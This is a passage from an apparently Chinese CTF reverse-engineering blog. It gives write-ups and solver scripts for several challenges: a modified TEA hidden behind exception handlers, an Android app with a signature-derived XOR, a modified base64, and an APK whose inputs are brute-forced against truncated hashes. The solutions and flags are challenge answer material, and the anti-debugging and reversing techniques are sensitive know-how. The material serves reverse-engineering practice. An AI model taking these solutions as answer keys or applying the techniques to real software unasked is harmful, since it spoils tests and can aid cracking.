class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> enc[<span class="number">42</span>] = &#123;</span><br><span class="line">    <span class="number">0x00000006</span>, <span class="number">0x0000010C</span>, <span class="number">0x00000201</span>, <span class="number">0x00000307</span>, <span class="number">0x0000041B</span>, <span class="number">0x00000551</span>, <span class="number">0x00000653</span>, <span class="number">0x00000706</span>, </span><br><span class="line">    <span class="number">0x00000853</span>, <span class="number">0x00000955</span>, <span class="number">0x00000A56</span>, <span class="number">0x00000B56</span>, <span class="number">0x00000C53</span>, <span class="number">0x00000D4D</span>, <span class="number">0x00000E55</span>, <span class="number">0x00000F50</span>, </span><br><span class="line">    <span class="number">0x00001001</span>, <span class="number">0x00001154</span>, <span class="number">0x0000124D</span>, <span class="number">0x00001354</span>, <span class="number">0x00001457</span>, <span class="number">0x00001557</span>, <span class="number">0x00001602</span>, <span class="number">0x0000174D</span>, </span><br><span class="line">    <span class="number">0x00001852</span>, <span class="number">0x00001957</span>, <span class="number">0x00001A58</span>, <span class="number">0x00001B02</span>, <span class="number">0x00001C4D</span>, <span class="number">0x00001D02</span>, <span class="number">0x00001E57</span>, <span class="number">0x00001F51</span>, </span><br><span class="line">    <span class="number">0x00002051</span>, <span class="number">0x00002150</span>, <span class="number">0x00002252</span>, <span class="number">0x00002356</span>, <span class="number">0x00002406</span>, <span class="number">0x00002506</span>, <span class="number">0x00002657</span>, <span class="number">0x00002701</span>, </span><br><span class="line">    <span class="number">0x00002804</span>, <span class="number">0x0000291D</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> Xor;</span><br><span class="line"><span class="keyword">int</span> i,j;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(Xor=<span class="number">0</span>;Xor&lt;<span class="number">127</span>;Xor++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">42</span>;j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,(enc[j]^Xor)&amp;<span class="number">0xff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag&#123;13f35663-50a4-477b-278b-b711026ff7ad&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Hell’s-Gate"><a href="#Hell’s-Gate" class="headerlink" title="Hell’s Gate"></a>Hell’s Gate</h2><p>表面上是一个魔改rc4，实际上每次遇到异或就会出现一个访问异常，我们需要去找到异常处理函数，在异常处理函数打个断点，发现还有个反调试，简单绕过进入加密函数，动调看数据分析后，发现是个魔改tea，开始是生成key和dealt，然后进行4轮加密，加密循环改为16。</p><p>动调出key，和dealt，写出解密脚本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//flag&#123;abcdefghijklmnopqrstuvwxyz012345678&#125; </span></span><br><span class="line"><span class="comment">//flag&#123;abcdefghijklmnopqrstuvwxyz&#125; </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 0xB879379E, 0x87654321, 0x13243546,0x64534231</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">// 0x12345678, 0x87654321, 0x13243546, 0x64534231, 0xB879379E</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> *code , <span class="keyword">unsigned</span> <span class="keyword">int</span> *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> delta=<span class="number">0x0B879379E</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v0,v1,sum=<span class="number">0x0B879379E</span>*<span class="number">16</span>,i;<span class="comment">// sum=0xC6EF3720</span></span><br><span class="line"></span><br><span class="line">    v0=code[<span class="number">0</span>];</span><br><span class="line">    v1=code[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">16</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        v1-=( (v0&lt;&lt;<span class="number">4</span>)+key[<span class="number">2</span>] ) ^ (v0+sum) ^ ( (v0&gt;&gt;<span class="number">5</span>)+key[<span class="number">3</span>] );</span><br><span class="line">        v0-=( (v1&lt;&lt;<span class="number">4</span>)+key[<span class="number">0</span>] ) ^ (v1+sum) ^ ( (v1&gt;&gt;<span class="number">5</span>)+key[<span class="number">1</span>] );</span><br><span class="line">        sum-=delta;</span><br><span class="line">    &#125;</span><br><span class="line">    code[<span class="number">0</span>]=v0;</span><br><span class="line">    code[<span class="number">1</span>]=v1;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//0f4d0db3668dd58cabb9eb409657eaa8</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> key[<span class="number">4</span>]=&#123; <span class="number">0x12345678</span>, <span class="number">0x87654321</span>, <span class="number">0x13243546</span>, <span class="number">0x64534231</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> code[<span class="number">8</span>]=&#123;<span class="number">0x2C94650B</span>, <span class="number">0x78494E9E</span>, <span class="number">0x0E7FACF44</span>, <span class="number">0x48F9DBFB</span>, <span class="number">0x547BB145</span>, <span class="number">0x925D2542</span>, <span class="number">0x69A9F4C4</span>, <span class="number">0x9A96A1D8</span> &#125;;</span><br><span class="line">    <span class="keyword">int</span> i; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        decrypt(&amp;code[i*<span class="number">2</span>],key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//printf(&quot;%08x:&quot;,code[i]);</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c%c%c%c&quot;</span>,*((<span class="keyword">char</span>*)&amp;code[i]+<span class="number">0</span>),*((<span class="keyword">char</span>*)&amp;code[i]+<span class="number">1</span>),*((<span class="keyword">char</span>*)&amp;code[i]+<span class="number">2</span>),*((<span class="keyword">char</span>*)&amp;code[i]+<span class="number">3</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>开始以为解出来交了就对了，结果后面会自动打印，然后动调得到flag。<br><code>flag&#123;0f4d0db3-668d-d58c-abb9-eb409657eaa8&#125;</code></p><h2 id="hello"><a href="#hello" class="headerlink" title="hello"></a>hello</h2><p>安卓逆向，分为两个部分，java主要就是需要得到一个签名值，so层函数就一个异或，加位运算。</p><p>运行app ，通过logcat -v time | findstr hello 获取签名值</p><p>得到异或值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">hash</span>=<span class="built_in">bytearray</span>(<span class="string">b&quot;308202e4308201cc020101300d06092a864886f70d010105050030373116301406035504030c0d416e64726f69642044656275673110300e060355040a0c07416e64726f6964310b30090603550406130255533020170d3231303330363134333034385a180f32303531303232373134333034385a30373116301406035504030c0d416e64726f69642044656275673110300e060355040a0c07416e64726f6964310b300906035504061302555330820122300d06092a864886f70d01010105000382010f003082010a0282010100cbf2b09e4308ebb459e8841e5a7b920497fef2b349e80648f7eb35f48d40a75e7ce7945b8b42d197bec0bf177e6c9899ed707dcc4a726cb14c1a69b0c4a02474806fa73cfb10e10f7b1665021c24762b6edad65ca63cea3c72e0d4e4ca3f98301173eec3254337af1f5a11f779ecbe04d1b74d53f5835e011222155a56f97e00d75374cd93080dfa087cd356a99fe1eebf5d6d5e31846aad5252c3a17a4656e2e210ce1c7aa4d147fb8cf440a50add61bbb2ec299a2e0dab0b4504796ac3a899da553ab1d83576691ab23409d18398014b3b5eaf12e83f4d99aa09e1e4e4cae133530730c1133da2b3dee37b58eb1a5795b221ec5a8830731a41167d295f9e1b0203010001300d06092a864886f70d010105050003820101000e4740235e9cf2be33de3e06d777139cbbc5cf0622285c17da04697b8067318aaf8df0fbb4d3166f293ea15aa2592f06eb6929af063722ac9f30ad85e2c087564931d6ac65fcd5fbc864b3dc9841e039c6e1d5fbc5c2f8adf90a547bc4ebc07d387914db24451c2cc89925359bd3bb0750c7aabf9d743b1893e98bbc8ff74b24fc0b4be2dbaaf1c917bba01496d0617ffc3a4a8b7a6e79a3036298a6ebf57bb00001e43a0b242864eebb0fcec9e323144d4447c878430f18e6e358ad97566fa04d1f07b171c1476c9af5a1eba0bf6616e219c0b9e1299d09fecded24a880397f92e0f99d8951228c7770c184fd77adff943bfc8b6aa524c5f0a6d7686fe35486&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">42</span>):</span><br><span class="line">    print(<span class="built_in">hash</span>[i * <span class="number">27</span> + <span class="number">327</span>] + i,end=<span class="string">&quot;,&quot;</span>)</span><br><span class="line"><span class="comment">#48,51,51,51,56,107,56,106,56,64,62,64,113,70,114,116,69,65,75,120,75,78,124,75,72,80,83,77,83,126,84,130,85,134,83,90,85,86,93,136,97,94</span></span><br></pre></td></tr></table></figure><p>然后位运算+异或</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> enc[<span class="number">42</span>] = &#123;</span><br><span class="line"><span class="number">0xCA</span>, <span class="number">0xEB</span>, <span class="number">0x4A</span>, <span class="number">0x8A</span>, <span class="number">0x68</span>, <span class="number">0xE1</span>, <span class="number">0xA1</span>, <span class="number">0xEB</span>, <span class="number">0xE1</span>, <span class="number">0xEE</span>, <span class="number">0x6B</span>, <span class="number">0x84</span>, <span class="number">0xA2</span>, <span class="number">0x6D</span>, <span class="number">0x49</span>, <span class="number">0xC8</span>, <span class="number">0x8E</span>, <span class="number">0x0E</span>, <span class="number">0xCC</span>, <span class="number">0xE9</span>, <span class="number">0x45</span>, <span class="number">0xCF</span>, <span class="number">0x23</span>, <span class="number">0xCC</span>, <span class="number">0xC5</span>, <span class="number">0x4C</span>, <span class="number">0x0C</span>, <span class="number">0x85</span>, <span class="number">0xCF</span>, <span class="number">0xA9</span>, <span class="number">0x8C</span>, <span class="number">0xF6</span>, <span class="number">0xE6</span>, <span class="number">0xD6</span>, <span class="number">0x26</span>, <span class="number">0x6D</span>, <span class="number">0xAC</span>, <span class="number">0x0C</span>, <span class="number">0xAC</span>, <span class="number">0x77</span>, <span class="number">0xE0</span>, <span class="number">0x64</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> Xor[]=&#123;<span class="number">48</span>,<span class="number">51</span>,<span class="number">51</span>,<span class="number">51</span>,<span class="number">56</span>,<span class="number">107</span>,<span class="number">56</span>,<span class="number">106</span>,<span class="number">56</span>,<span class="number">64</span>,<span class="number">62</span>,<span class="number">64</span>,<span class="number">113</span>,<span class="number">70</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">69</span>,<span class="number">65</span>,<span class="number">75</span>,<span class="number">120</span>,<span class="number">75</span>,<span class="number">78</span>,<span class="number">124</span>,<span class="number">75</span>,<span class="number">72</span>,<span class="number">80</span>,<span class="number">83</span>,<span class="number">77</span>,<span class="number">83</span>,<span class="number">126</span>,<span class="number">84</span>,<span class="number">130</span>,<span class="number">85</span>,<span class="number">134</span>,<span class="number">83</span>,<span class="number">90</span>,<span class="number">85</span>,<span class="number">86</span>,<span class="number">93</span>,<span class="number">136</span>,<span class="number">97</span>,<span class="number">94</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> i,j;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">42</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">enc[i] = ((enc[i] &lt;&lt; <span class="number">3</span>) | (enc[i] &gt;&gt; <span class="number">5</span>)) &amp; <span class="number">0xff</span>;</span><br><span class="line">enc[i]^=Xor[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,enc);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag&#123;d5577edd-8211-7a0e-f23a-305b0b10683f&#125;</span></span><br></pre></td></tr></table></figure><h2 id="mod"><a href="#mod" class="headerlink" title="mod"></a>mod</h2><p>花指令+魔改base64</p><p>只需要知道怎么魔改的就行，由于时间关系没直接利用位运算写脚本。</p><p>先得到二进制模式。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">print(<span class="built_in">bin</span>(<span class="built_in">ord</span>(<span class="string">&#x27;f&#x27;</span>)))</span><br><span class="line">print(<span class="built_in">bin</span>(<span class="built_in">ord</span>(<span class="string">&#x27;l&#x27;</span>)))</span><br><span class="line">print(<span class="built_in">bin</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)))</span><br><span class="line">table=<span class="string">&quot;ABCDFEGH1JKLRSTMNP0VWQUXY2a8cdefijklmnopghwxyqrstuvzOIZ34567b9+/&quot;</span></span><br><span class="line">enc=<span class="string">&quot;2aYcdfL2fS1BTMMF1RSeMTTASS1OJ8RHTJdBYJ2STJfNMSMAYcKUJddp&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">    print(table.index(i),end=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">print(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">mid=[<span class="number">25</span>,<span class="number">26</span>,<span class="number">24</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">31</span>,<span class="number">11</span>,<span class="number">25</span>,<span class="number">31</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">15</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">30</span>,<span class="number">15</span>,<span class="number">14</span>,<span class="number">14</span>,<span class="number">0</span>,<span class="number">13</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">52</span>,<span class="number">9</span>,<span class="number">27</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">14</span>,<span class="number">9</span>,<span class="number">29</span>,<span class="number">1</span>,<span class="number">24</span>,<span class="number">9</span>,<span class="number">25</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">9</span>,<span class="number">31</span>,<span class="number">16</span>,<span class="number">15</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">24</span>,<span class="number">28</span>,<span class="number">10</span>,<span class="number">22</span>,<span class="number">9</span>,<span class="number">29</span>,<span class="number">29</span>,<span class="number">39</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> mid:</span><br><span class="line">    print(<span class="string">&#x27;\&#x27;&#123;:06b&#125;\&#x27;&#x27;</span>.<span class="built_in">format</span>(i),end=<span class="string">&#x27;,\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>然后将字符串4个为一组，进行还原为二进制。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">s=[<span class="string">&#x27;001001&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;011101&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;011101&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;100111&#x27;</span>,]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(s[<span class="number">0</span>][<span class="number">0</span>:<span class="number">2</span>],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">print(s[<span class="number">2</span>][<span class="number">2</span>:<span class="number">4</span>],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">print(s[<span class="number">3</span>][<span class="number">0</span>:<span class="number">2</span>],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">print(s[<span class="number">1</span>][<span class="number">4</span>:<span class="number">6</span>],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print(s[<span class="number">1</span>][<span class="number">0</span>:<span class="number">2</span>],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">print(s[<span class="number">0</span>][<span class="number">2</span>:<span class="number">4</span>],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">print(s[<span class="number">3</span>][<span class="number">2</span>:<span class="number">4</span>],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">print(s[<span class="number">2</span>][<span class="number">4</span>:<span class="number">6</span>],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print(s[<span class="number">2</span>][<span class="number">0</span>:<span class="number">2</span>],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">print(s[<span class="number">1</span>][<span class="number">2</span>:<span class="number">4</span>],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">print(s[<span class="number">3</span>][<span class="number">4</span>:<span class="number">6</span>],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">print(s[<span class="number">0</span>][<span class="number">4</span>:<span class="number">6</span>],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>组合起来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">x = <span class="string">&#x27;011001100110110001100001011001110111101100110101011000010011000000110111001100110011011100110010001101000010110100111000001100100011001000110011001011010011010000110001001100110110010000101101001100010011000101100110011000010010110101100100001101010011001101100010001100010011001100110011011001000110011000111000001110010110010101111101&#x27;</span></span><br><span class="line">print(<span class="built_in">hex</span>(<span class="built_in">int</span>(x, <span class="number">2</span>)))</span><br><span class="line">a=<span class="number">0x666c61677b35613037333732342d383232332d343133642d313166612d6435336231333364663839657d</span></span><br><span class="line">enc = <span class="built_in">bytearray</span>.fromhex(<span class="string">&#x27;666c61677b35613037333732342d383232332d343133642d313166612d6435336231333364663839657d&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">print(<span class="built_in">chr</span>(i),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#flag&#123;5a073724-8223-413d-11fa-d53b133df89e&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最近一些比较有意思的题</title>
      <link href="2021/10/27/%E6%9C%80%E8%BF%91%E4%B8%80%E4%BA%9B%E6%AF%94%E8%BE%83%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E9%A2%98/"/>
      <url>2021/10/27/%E6%9C%80%E8%BF%91%E4%B8%80%E4%BA%9B%E6%AF%94%E8%BE%83%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="一些比较有意思的题"><a href="#一些比较有意思的题" class="headerlink" title="一些比较有意思的题"></a>一些比较有意思的题</h1><p>实际上最近的比赛都有在打，只是没有整理了，一方面是时间不够，二是觉得做起的题的难度也就那样，没必要整理，就把最近感觉比较有含金量的题整理整理。最近也在出题，好忙。。。不过值得高兴的是，原本以为之前打的两个比赛已经没什么希望了，结果一个还有奖金，一个还进了线下，昨天永劫无间还用免费宝箱开了个冰魄皮肤，哈哈哈，欧皇竟是我自己。</p><p>这篇文章就整理最近觉得比较好的题。</p><h2 id="HaHaHaHa"><a href="#HaHaHaHa" class="headerlink" title="HaHaHaHa"></a>HaHaHaHa</h2><p>比赛时，搞了一个下午，java爆破太慢了。</p><p>先下载apk打开看看，发现是要输入8个字符串，然后没有小写字符。</p><p>用jeb打开。</p><p>发现使用了一个for循环来处理8个字符串。<br><img src="https://i.loli.net/2021/10/25/r8JzgmQiENs67tx.png"><br>然后下面有一个处理字符串的函数，也就是a类中的c函数。<br><img src="https://i.loli.net/2021/10/25/fXcG2FyMHuThWnP.png"><br>然后下面使用修改后的数据去进行各种hash加密。<br><img src="https://i.loli.net/2021/10/25/Ww2KtHx8amr5DG7.png"><br>接下来看如何通过传入的第一个参数从而决定到底是哪种hash。<br><img src="https://i.loli.net/2021/10/25/C72r95BxYdPpAlE.png"><br>然后直接去解就会发现不对劲，原来是在开始的时候，修改了a类中的数据。<br><img src="https://i.loli.net/2021/10/25/jhpxNanSvr5QFLD.png"><br>然后先得到8个字符串的加密方式。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   <span class="keyword">int</span>[] b;</span><br><span class="line">   <span class="keyword">int</span> i;</span><br><span class="line">   b = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">0xAF</span>, <span class="number">0xA1</span>, <span class="number">0xA4</span>, <span class="number">170</span>, <span class="number">0xA5</span>, <span class="number">0xAE</span>, <span class="number">0xA0</span>, <span class="number">0xA3</span>&#125;;</span><br><span class="line">   <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;b.length;i++)</span><br><span class="line">   &#123;</span><br><span class="line">       System.out.print(b[i]);</span><br><span class="line">       System.out.print(<span class="string">&quot; &quot;</span>);</span><br><span class="line">       System.out.print((b[i]^<span class="number">0xab</span>) &gt;&gt;&gt; <span class="number">3</span> &amp; <span class="number">1</span>);</span><br><span class="line">       System.out.print(<span class="string">&quot; &quot;</span>);</span><br><span class="line">       System.out.println((b[i]^<span class="number">0xab</span>)&amp;<span class="number">7</span>);</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//        0 4 SHA-256  fc7466e55fbf37b1</span></span><br><span class="line"><span class="comment">//        1 2 HmacSha512 78b0be39e63b6837</span></span><br><span class="line"><span class="comment">//        1 7 HmacSha512 c2f9c805d0442203</span></span><br><span class="line"><span class="comment">//        0 1 MD5       c11a61bb60d79dab</span></span><br><span class="line"><span class="comment">//        1 6 HmacSha512  869e650ee55bd9f6</span></span><br><span class="line"><span class="comment">//        0 5 SHA-384   f2dda5fc021fe2bf</span></span><br><span class="line"><span class="comment">//        1 3 HmacSha512  305044db48fe6174</span></span><br><span class="line"><span class="comment">//        1 0 HmacSha512  d6659b5e2d1059f8</span></span><br></pre></td></tr></table></figure><p>然后开始解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">                <span class="built_in">str</span> = <span class="built_in">chr</span>(a)+<span class="built_in">chr</span>(b)+<span class="built_in">chr</span>(c)+<span class="built_in">chr</span>(d)</span><br><span class="line">                print(<span class="built_in">str</span>)</span><br><span class="line">                flag = hashlib.sha384(<span class="built_in">str</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">                <span class="keyword">if</span> flag[<span class="number">0</span>:<span class="number">16</span>] == <span class="string">&#x27;f2dda5fc021fe2bf&#x27;</span>:</span><br><span class="line">                    print(<span class="built_in">str</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                    exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>HmacSha512比较特殊，就直接用了类中的函数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 